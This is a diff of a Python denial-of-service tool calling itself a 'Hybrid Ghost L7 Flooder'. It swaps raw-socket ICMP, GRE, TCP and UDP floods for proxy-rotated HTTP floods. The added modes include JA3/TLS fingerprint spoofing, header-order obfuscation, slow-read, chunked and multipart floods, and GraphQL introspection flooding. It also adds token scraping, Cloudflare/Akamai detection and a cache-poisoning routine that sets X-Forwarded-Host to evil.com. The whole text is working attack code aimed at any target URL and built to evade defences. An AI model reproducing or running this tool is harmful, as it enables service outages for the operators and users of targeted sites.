-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        while True:
-            for offset in range(0, 100, 10):
-                packet = generate_icmp_packet(offset)
-                sock.sendto(packet, (target, 1))
-                await asyncio.sleep(0.01)
+            await asyncio.sleep(smart_jitter())
 
-    tasks = [flood() for _ in range(threads)]
+# Reverse-Choke Injection
+async def reverse_choke_flood(target, proxies, threads, use_tls):
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_reverse_choke(target, proxies, use_tls))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# GRE Amplification (L3)
-async def gre_amplification(target, threads):
-    def generate_gre_packet():
-        gre_header = b'\xFF\xFF'  # GRE header (example)
-        payload = b'\x00' * 100  # Dummy payload
-        return gre_header + payload
+async def http_flood_reverse_choke(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            try:
+                async with session.post(target, headers=headers, data=nextjs_payload(), timeout=aiohttp.ClientTimeout(sock_read=15)) as resp:
+                    await asyncio.sleep(random.uniform(1.5, 3.5))  # Delay hold connection
+            except Exception as e:
+                print(f"[RCI Error] {e}")
 
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_GRE)
-        while True:
-            packet = generate_gre_packet()
-            sock.sendto(packet, (target, 0))
-            await asyncio.sleep(0.01)
+            await asyncio.sleep(smart_jitter())
 
-    tasks = [flood() for _ in range(threads)]
+# Logic Flood
+async def logic_flood_mode(target, proxies, threads, use_tls):
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_logic(target, proxies, use_tls))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# TCP ACK Flood (L4)
-async def tcp_ack_flood(target, threads):
-    def generate_tcp_ack_packet():
-        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
-        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
-        return ip_header + tcp_header
+async def http_flood_logic(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            try:
+                res1 = await session.post(f"{target}/login", headers=headers, data=nextjs_payload())
+                if res1.status == 200:
+                    await session.get(f"{target}/admin/logs", headers=headers)
+                    await session.post(f"{target}/api/commit", headers=headers, data=nextjs_payload())
+            except Exception as e:
+                print(f"[Logic Flood Error] {e}")
 
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        while True:
-            packet = generate_tcp_ack_packet()
-            sock.sendto(packet, (target, 0))
-            await asyncio.sleep(0.01)
+            await asyncio.sleep(smart_jitter())
 
-    tasks = [flood() for _ in range(threads)]
+# Slicer Mode
+async def slicer_flood_mode(target, proxies, threads, use_tls):
+    random.shuffle(proxies)
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http_flood_slicer(target, proxies, use_tls))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# TCP Xmas Tree Flood (L4)
-async def tcp_xmas_tree_flood(target, threads):
-    def generate_tcp_xmas_packet():
-        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
-        tcp_header = b'\x50\x00\x00\x00\x01\x00\x00\x00'  # TCP header with flags set
-        return ip_header + tcp_header
+async def http_flood_slicer(target, proxies, use_tls):
+    global total_requests, proxy_success, proxy_fail
+    V_PATHS = ["/", "/login", "/api/feedback", "/_next/data/", "/admin", "/config", "/robots.txt"]
+    while True:
+        proxy_url = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy_url)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            headers = generate_headers(target)
+            path = random.choice(V_PATHS)
+            if path.endswith("/"):
+                path += str(uuid.uuid4())
+            url = target + path
+            try:
+                await session.get(url, headers=headers)
+            except Exception as e:
+                print(f"[Slicer Error] {e}")
 
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        while True:
-            packet = generate_tcp_xmas_packet()
-            sock.sendto(packet, (target, 0))
-            await asyncio.sleep(0.01)
+            await asyncio.sleep(smart_jitter())
 
-    tasks = [flood() for _ in range(threads)]
+# Auto Target Capability Detection
+async def detect_target_profile(session, target):
+    try:
+        res = await session.get(target)
+        if res.status in (403, 503):
+            print(Fore.RED + f"[!] Target blocking unknown agents or rate: {res.status}")
+        if 'cf-ray' in res.headers or 'cloudflare' in str(res.headers).lower():
+            print(Fore.YELLOW + "[!] Cloudflare Detected")
+        if 'vercel' in str(res.headers).lower():
+            print(Fore.YELLOW + "[!] Vercel Hosting Detected")
+        if 'akamai' in str(res.headers).lower():
+            print(Fore.YELLOW + "[!] Akamai Detected")
+        if '/_next/' in await res.text():
+            print(Fore.CYAN + "[+] Next.js Structure Detected")
+    except Exception as e:
+        print(Fore.RED + f"[!] Detection Failed: {e}")
+
+# Auto Mix Flood Mode
+async def auto_mix_flood(target, proxies, threads, use_tls=False):
+    modes = [
+        http_flood_exploit,
+        http_flood_adaptive,
+        http_flood_ai_bypass,
+        http_flood_tls_fingerprint,
+        http_flood_reverse_choke,
+        http_flood_slicer
+    ]
+    tasks = []
+    for _ in range(threads):
+        flood_fn = random.choice(modes)
+        task = asyncio.create_task(flood_fn(target, proxies, use_tls))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# UDP Protocol Exhaustion (L4)
-async def udp_protocol_exhaustion(target, threads):
-    def generate_udp_packet():
-        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
-        udp_header = b'\x00\x00\x00\x00'  # UDP header (example)
-        return ip_header + udp_header
-
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
-        while True:
-            packet = generate_udp_packet()
-            sock.sendto(packet, (target, 0))
-            await asyncio.sleep(0.01)
-
-    tasks = [flood() for _ in range(threads)]
+# HTTP/2 Flood Mode
+async def http2_flood_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(http2_flood_client(target, generate_headers(target), nextjs_payload()))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# TLS Handshake Exhaustion (L4)
-async def tls_handshake_exhaustion(target, threads):
-    def generate_tls_handshake_packet():
-        ip_header = b'\x45\x00\x00\x28'  # IP header (example)
-        tcp_header = b'\x50\x00\x00\x00'  # TCP header (example)
-        tls_handshake = b'\x16\x03\x01\x00\x01\x00\x00'  # TLS handshake (example)
-        return ip_header + tcp_header + tls_handshake
+async def http2_flood_client(target, headers, data):
+    async with httpx.AsyncClient(http2=True, verify=False) as client:
+        try:
+            res = await client.post(target, headers=headers, data=data, timeout=10)
+            print(f"[h2] Status: {res.status_code}")
+        except Exception as e:
+            print(f"[h2-error] {e}")
 
-    async def flood():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        while True:
-            packet = generate_tls_handshake_packet()
-            sock.sendto(packet, (target, 443))
-            await asyncio.sleep(0.01)
-
-    tasks = [flood() for _ in range(threads)]
+# Fragmented Payload Mode
+async def chunked_payload_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        proxy_url = random.choice(proxies)
+        task = asyncio.create_task(chunked_payload_stream(target, proxy_url))
+        tasks.append(task)
     await asyncio.gather(*tasks)
 
-# Dynamic Payload Mutation (L7)
-async def dynamic_payload_mutation(target, proxies, threads, use_tls=False):
+async def chunked_payload_stream(target, proxy_url):
+    connector = ProxyConnector.from_url(proxy_url)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        headers = {
+            "User-Agent": generate_user_agent(),
+            "Transfer-Encoding": "chunked",
+            "Content-Type": "application/json"
+        }
+        body = "4\r\n{\"a\":\r\n6\r\n\"b\":1}\r\n0\r\n\r\n"
+        try:
+            async with session.post(target, headers=headers, data=body) as res:
+                print(f"[chunked] {res.status}")
+        except Exception as e:
+            print(f"[chunked-error] {e}")
+
+# Multipart Form-Data Payload Flood Mode
+async def multipart_flood_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        proxy_url = random.choice(proxies)
+        task = asyncio.create_task(multipart_flood_injector(target, proxy_url))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+async def multipart_flood_injector(target, proxy_url):
+    connector = ProxyConnector.from_url(proxy_url)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        form = aiohttp.FormData()
+        form.add_field("username", uuid.uuid4().hex)
+        form.add_field("file", b"A" * 1024, filename="payload.txt", content_type="application/octet-stream")
+        headers = generate_headers(target)
+        try:
+            async with session.post(target, data=form, headers=headers) as res:
+                print(f"[multipart] Status: {res.status}")
+        except Exception as e:
+            print(f"[multipart-error] {e}")
+
+# Header Order Obfuscation Mode
+async def header_order_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        proxy_url = random.choice(proxies)
+        headers = header_order_randomizer(generate_headers(target))
+        task = asyncio.create_task(http_flood(target, [proxy_url], use_tls, headers))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+def header_order_randomizer(headers: dict):
+    keys = list(headers.keys())
+    random.shuffle(keys)
+    return collections.OrderedDict((k, headers[k]) for k in keys)
+
+# Stream Upload Simulation Mode
+async def stream_body_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        proxy_url = random.choice(proxies)
+        task = asyncio.create_task(stream_body_flood(target, proxy_url))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+class Streamer:
+    def __aiter__(self):
+        self.chunks = [b"{\"key\":", b"\"value\"}", b""]
+        return self
+
+    async def __anext__(self):
+        if not self.chunks:
+            raise StopAsyncIteration
+        await asyncio.sleep(0.5)
+        return self.chunks.pop(0)
+
+async def stream_body_flood(target, proxy_url):
+    connector = ProxyConnector.from_url(proxy_url)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        headers = generate_headers(target)
+        headers['Content-Type'] = "application/json"
+        try:
+            async with session.post(target, data=Streamer(), headers=headers) as res:
+                print(f"[stream] {res.status}")
+        except Exception as e:
+            print(f"[stream-error] {e}")
+
+# Auto Endpoint Discovery Mode
+async def discover_endpoints_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        task = asyncio.create_task(discover_endpoints(target))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+async def discover_endpoints(target):
     async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+        try:
+            res = await session.get(target)
+            html = await res.text()
+            found = re.findall(r'href="(/[^"]+)"', html)
+            api_paths = [p for p in found if p.startswith("/api") or "/admin" in p]
+            print(f"[discover] Found endpoints: {api_paths}")
+            return list(set(api_paths))
+        except Exception as e:
+            print(f"[discover-error] {e}")
+            return []
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
+# JA3 Fingerprint Per Proxy Mode
+async def ja3_per_proxy_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for proxy_url in proxies:
+        session = get_tls_session_for_proxy(proxy_url)
+        task = asyncio.create_task(http_flood(target, [proxy_url], use_tls, session))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+def get_tls_session_for_proxy(proxy_url):
+    ja3 = random.choice(JA3_FINGERPRINTS)
+    s = Session(client_identifier=ja3)
+    s.proxies = {"http": proxy_url, "https": proxy_url}
+    return s
+
+# HEAD/PUT Flood + Nonstandard Verb Mode
+async def verb_abuse_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        proxy_url = random.choice(proxies)
+        task = asyncio.create_task(verb_abuse_flood(target, proxy_url))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+async def verb_abuse_flood(target, proxy_url):
+    connector = ProxyConnector.from_url(proxy_url)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        headers = generate_headers(target)
+        try:
+            await session.request("HEAD", target, headers=headers)
+            await session.request("PUT", target, headers=headers, data="x=1")
+            print("[verb-abuse] Sent")
+        except Exception as e:
+            print(f"[verb-error] {e}")
+
+# Token Extract from JS Before Attack Mode
+async def token_extract_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        proxy_url = random.choice(proxies)
+        task = asyncio.create_task(token_extract_and_flood(target, proxy_url))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+async def token_extract_and_flood(target, proxy_url):
+    connector = ProxyConnector.from_url(proxy_url)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        try:
+            res = await session.get(f"{target}/_next/static/ssg-manifest.json")
+            token = "dummy"
+            if res.status == 200:
+                txt = await res.text()
+                token = re.search(r'"([a-zA-Z0-9\-_]{20,})"', txt).group(1)
+            headers = generate_headers(target)
+            headers["Authorization"] = f"Bearer {token}"
+            data = nextjs_payload()
+            async with session.post(target, headers=headers, data=data) as post_response:
+                status_code = post_response.status
+                print(f"[token-extract] Status: {status_code} | Token: {token}")
+        except Exception as e:
+            print(f"[token-extract] {e}")
+
+# HTTP/2 Multiplexing Simulation Mode
+async def h2_multiplex_mode(target, proxies, threads, use_tls):
+    tasks = []
+    for _ in range(threads):
+        headers = generate_headers(target)
+        task = asyncio.create_task(h2_multiplex_simulator(target, headers))
+        tasks.append(task)
+    await asyncio.gather(*tasks)
+
+async def h2_multiplex_simulator(target, headers):
+    async with httpx.AsyncClient(http2=True) as client:
+        try:
+            await asyncio.gather(
+                client.get(target + "/favicon.ico", headers=headers),
+                client.get(target + "/api/feedback", headers=headers),
+                client.post(target, headers=headers, data=nextjs_payload())
+            )
+            print("[h2-mux] Sent")
+        except Exception as e:
+            print(f"[h2-mux-error] {e}")
+
+# Burst Layer Flood Controller
+async def burst_layer_flood(target, proxies, burst_size=20, pause=2):
+    async def burst_wave():
+        for _ in range(burst_size):
+            proxy = random.choice(proxies)
+            connector = ProxyConnector.from_url(proxy)
+            headers = generate_headers(target)
+            async with aiohttp.ClientSession(connector=connector) as session:
                 try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                        # Mutate payload dynamically
-                        data = base64.b64encode(data.encode()).decode()
-                        data = json.dumps({'nested': data})
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+                    await session.post(target, headers=headers, data=nextjs_payload())
+                except:
+                    pass
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
+    while True:
+        await asyncio.gather(*[asyncio.create_task(burst_wave())])
+        await asyncio.sleep(pause)
 
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+# GraphQL Introspection Flood
+GRAPHQL_QUERY = json.dumps({
+  "query": "query IntrospectionQuery { __schema { types { name fields { name } } } }"
+})
 
-# Header Overflow Exploit (L7)
-async def header_overflow_exploit(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
+async def graphql_flood(target, proxies):
+    while True:
+        proxy = random.choice(proxies)
+        connector = ProxyConnector.from_url(proxy)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            try:
+                await session.post(f"{target}/graphql", headers=generate_headers(target), data=GRAPHQL_QUERY)
+            except:
+                pass
+        await asyncio.sleep(smart_jitter())
 
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
+# Slow Read Emulation (client recv lambat)
+async def slow_read_emulator(target, proxies):
+    proxy = random.choice(proxies)
+    connector = ProxyConnector.from_url(proxy)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        try:
+            async with session.get(target, headers=generate_headers(target)) as resp:
+                while True:
+                    chunk = await resp.content.read(1)
+                    if not chunk:
                         break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    # Overflow headers
-                    headers['Custom-Header'] = 'A' * 1000
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
+                    await asyncio.sleep(0.3)  # sengaja lambat terima
+        except:
+            pass
 
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
+# Redirect Chain Stressor
+async def redirect_stressor(target, proxies):
+    redirect_path = "/redirect?url=https://google.com"  # bisa diubah
+    proxy = random.choice(proxies)
+    connector = ProxyConnector.from_url(proxy)
+    async with aiohttp.ClientSession(connector=connector) as session:
+        try:
+            await session.get(target + redirect_path, headers=generate_headers(target), allow_redirects=True)
+        except:
+            pass
 
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
+# Cache Poison Chain (CDN destroyer)
+async def cache_poison_flood(target, proxies):
+    proxy = random.choice(proxies)
+    connector = ProxyConnector.from_url(proxy)
+    headers = generate_headers(target)
+    headers.update({
+        "X-Forwarded-Host": "evil.com",
+        "X-Cache-Key": str(uuid.uuid4()),
+        "X-Origin-Cache-Control": "no-store"
+    })
+    async with aiohttp.ClientSession(connector=connector) as session:
+        try:
+            await session.get(target, headers=headers)
+        except:
+            pass
 
-# Cookie Logic Bombing (L7)
-async def cookie_logic_bombing(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    # Logic bomb in cookie
-                    headers['Cookie'] = 'user=admin; path=/; httponly; secure; samesite=strict'
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# Bypass JavaScript Challenge (L7)
-async def bypass_javascript_challenge(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    # Bypass JavaScript challenge
-                    headers['X-Requested-With'] = 'XMLHttpRequest'
-                    headers['Referer'] = target
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# Recursive Path & Ref Exploit (L7)
-async def recursive_path_ref_exploit(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    # Recursive path and ref
-                    target_path = f"{target}/recursive?ref={target}"
-                    async with safe_post(session, target_path, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# Intelligent Async Socket Bomb (L7)
-async def intelligent_async_socket_bomb(target, proxies, threads, use_tls=False):
-    async with aiohttp.ClientSession() as session:
-        def generate_payload():
-            return json.dumps({'key': uuid.uuid4().hex})
-
-        async def http_flood():
-            global total_requests
-            while True:
-                proxy = None
-                for _ in range(3):
-                    p = random.choice(proxies)
-                    if await validate_proxy(p):
-                        proxy = p
-                        break
-                if not proxy:
-                    continue  # skip iteration
-                headers = generate_headers(target)
-                data = generate_payload()
-                try:
-                    start = time.time()
-                    async with safe_post(session, target, headers=headers, data=data, proxy=proxy) as post_response:
-                        status_code = post_response.status
-                        latency = round((time.time() - start) * 1000)
-                        print(f"[green]Status: {status_code} | Latency: {latency} ms | Proxy: {proxy}")
-                        if status_code < 400:
-                            global proxy_success
-                            proxy_success += 1
-                        else:
-                            global proxy_fail
-                            proxy_fail += 1
-                        total_requests += 1
-                        # Intelligent socket bombing
-                        if random.choice([True, False]):
-                            await raw_packet_flood(target, 10)
-                except Exception as e:
-                    print(f"[red]Error: {str(e)}")
-
-                await asyncio.sleep(random.uniform(0.05, 0.2) + random.expovariate(3))
-
-        tasks = [http_flood() for _ in range(threads)]
-        await asyncio.gather(*tasks)
-
-# Real-Time Status Tracker
-async def real_time_status_tracker(threads, start_time, end_time):
-    import time
-
-    console = Console()
-    with Live(console=console, refresh_per_second=2, screen=False) as live:
-        while time.time() < end_time:
-            table = Table(title="[ LIVE ]  ⚡️ Flood Monitor v1.0")
-            table.add_column("🧩 Metric", style="cyan", no_wrap=True)
-            table.add_column("📊 Value", style="magenta")
-
-            # Handle nilai default dari variabel global
-            success = proxy_success if 'proxy_success' in globals() else 0
-            fail = proxy_fail if 'proxy_fail' in globals() else 0
-            total = total_requests if 'total_requests' in globals() else 0
-            code200 = status_codes.get(200, 0) if 'status_codes' in globals() else 0
-            code403 = status_codes.get(403, 0) if 'status_codes' in globals() else 0
-            code503 = status_codes.get(503, 0) if 'status_codes' in globals() else 0
-            avg = round(average_rtt / total, 2) if total > 0 and 'average_rtt' in globals() else 0
-            proxy_active = success + fail
-
-            table.add_row("🛰️ Target", target)
-            table.add_row("🧵 Threads", str(threads))
-            table.add_row("🎯 Success", str(success))
-            table.add_row("⛔️ Failed", str(fail))
-            table.add_row("📡 Total Requests", str(total))
-            table.add_row("🔁 Proxy Rotate", f"{proxy_active} aktif / {len(proxies)} total")
-            table.add_row("⚙️ Status 200", str(code200))
-            table.add_row("⚙️ Status 403", str(code403))
-            table.add_row("⚙️ Status 503", str(code503))
-            table.add_row("📡 Avg Latency", f"{avg} ms")
-            table.add_row("📦 Payload Type", "chained_json" if success % 2 == 0 else "ghost_obf")
-            table.add_row("🔁 Mutate UA", "On (GoogleBot Spoof)")
-
-            live.update(table)
-            await asyncio.sleep(1)
-
-async def main( ):
-    global proxy_success, proxy_fail, total_requests, status_codes, average_rtt
-
-    proxy_success = 0
-    proxy_fail = 0
-    total_requests = 0
-    status_codes = collections.Counter()
-    average_rtt = 0
-
-    parser = argparse.ArgumentParser(description="Hybrid Ghost L7 Flooder vFinal")
-    parser.add_argument("target", help="Target URL (e.g. https://example.com)")
-    parser.add_argument("--threads", type=int, default=50, help="Number of concurrent threads")
-    parser.add_argument("--proxies", type=str, required=True, help="Comma-separated proxies (http://ip:port)")
-    parser.add_argument("--tls", action="store_true", help="Enable TLS Spoofing mode")
-    parser.add_argument("--smart-mutate", action="store_true", help="Enable Smart Flood Mutation")
-    parser.add_argument("--exploit-chain-mode", action="store_true", help="Enable Exploit-aware Chaining Mode")
-    parser.add_argument("--ghost-mutate-deep", action="store_true", help="Enable Adaptive Ghost Mutation Engine")
-    parser.add_argument("--ai-header-bypass", action="store_true", help="Enable AI-Bypass Header Synthesis")
-    parser.add_argument("--tls-fingerprint-rotate", action="store_true", help="Enable Real-Time Fingerprint Spoofer (TLS + JA3)")
-    parser.add_argument("--proxy-auto-score", action="store_true", help="Enable Proxy Score Autobalancer")
-    parser.add_argument("--simulate-waf-react", action="store_true", help="Enable WAF Reaction Simulator")
-    parser.add_argument("--log-success", action="store_true", help="Log successful payloads")
-    parser.add_argument("--replay-mode", action="store_true", help="Replay logged successful payloads")
-    parser.add_argument("--timed-chain", action="store_true", help="Enable Time-based Chainer")
-    parser.add_argument("--l7l4-blend", action="store_true", help="Enable Extra Brutality: Partial L4 Blend")
-    parser.add_argument("--raw-packet-flood", action="store_true", help="Enable Raw Packet Flood (L3)")
-    parser.add_argument("--ip-fragmentation-exploit", action="store_true", help="Enable IP Fragmentation Exploit (L3)")
-    parser.add_argument("--icmp-fragment-flood", action="store_true", help="Enable ICMP Fragment Flood (L3)")
-    parser.add_argument("--gre-amplification", action="store_true", help="Enable GRE Amplification (L3)")
-    parser.add_argument("--tcp-ack-flood", action="store_true", help="Enable TCP ACK Flood (L4)")
-    parser.add_argument("--tcp-xmas-tree-flood", action="store_true", help="Enable TCP Xmas Tree Flood (L4)")
-    parser.add_argument("--udp-protocol-exhaustion", action="store_true", help="Enable UDP Protocol Exhaustion (L4)")
-    parser.add_argument("--tls-handshake-exhaustion", action="store_true", help="Enable TLS Handshake Exhaustion (L4)")
-    parser.add_argument("--dynamic-payload-mutation", action="store_true", help="Enable Dynamic Payload Mutation (L7)")
-    parser.add_argument("--header-overflow-exploit", action="store_true", help="Enable Header Overflow Exploit (L7)")
-    parser.add_argument("--cookie-logic-bombing", action="store_true", help="Enable Cookie Logic Bombing (L7)")
-    parser.add_argument("--bypass-javascript-challenge", action="store_true", help="Enable Bypass JavaScript Challenge (L7)")
-    parser.add_argument("--recursive-path-ref-exploit", action="store_true", help="Enable Recursive Path & Ref Exploit (L7)")
-    parser.add_argument("--intelligent-async-socket-bomb", action="store_true", help="Enable Intelligent Async Socket Bomb (L7)")
-    args = parser.parse_args()
-
-    target = args.target
-    threads = args.threads
-    proxies = load_proxies(args.proxies)
-    use_tls = args.tls
-
-    if proxies:
-        valid_proxies = [proxy for proxy in proxies if asyncio.run(validate_proxy(proxy))]
-        if not valid_proxies:
-            print(Fore.RED + "[!] No valid proxies found.")
-            return
-        proxies = valid_proxies
-
-    asyncio.run(detect_waf(aiohttp.ClientSession(), target))
-
-    attack_end = time.time() + 60  # Default duration of 60 seconds
+# Auto Mix Overload Flood
+async def auto_mix_overload_flood(target, proxies, threads):
+    overload_modes = [
+        burst_layer_flood,
+        graphql_flood,
+        slow_read_emulator,
+        redirect_stressor,
+        cache_poison_flood,
+        http_flood_exploit,
+        http_flood_tls_fingerprint,
+        http2_flood_client,
+        http_flood_multipart,
+        http_flood_chunked,
+    ]
 
     tasks = []
+    for _ in range(threads):
+        mode_fn = random.choice(overload_modes)
+        task = asyncio.create_task(mode_fn(target, proxies))
+        tasks.append(task)
 
-    if args.smart_mutate:
-        tasks.append(smart_flood_mutation(target, proxies, threads, use_tls))
-    if args.exploit_chain_mode:
-        tasks.append(exploit_chaining_mode(target, proxies, threads, use_tls))
-    if args.ghost_mutate_deep:
-        tasks.append(adaptive_ghost_mutation(target, proxies, threads, use_tls))
-    if args.ai_header_bypass:
-        tasks.append(ai_bypass_header_synthesis(target, proxies, threads, use_tls))
-    if args.tls_fingerprint_rotate:
-        tasks.append(tls_fingerprint_rotate(target, proxies, threads, use_tls))
-    if args.proxy_auto_score:
-        tasks.append(proxy_score_autobalancer(target, proxies, threads, use_tls))
-    if args.simulate_waf_reac:
-        tasks.append(waf_reaction_simulator(target, proxies, threads, use_tls))
-    if args.log_success or args.replay_mode:
-        tasks.append(attack_log_replay(target, proxies, threads, use_tls, args.replay_mode))
-    if args.timed_chain:
-        tasks.append(timed_chainer(target, proxies, threads, use_tls))
-    if args.l7l4_blend:
-        tasks.append(l7l4_blend(target, proxies, threads, use_tls))
-    if args.raw_packet_flood:
-        tasks.append(raw_packet_flood(target, threads))
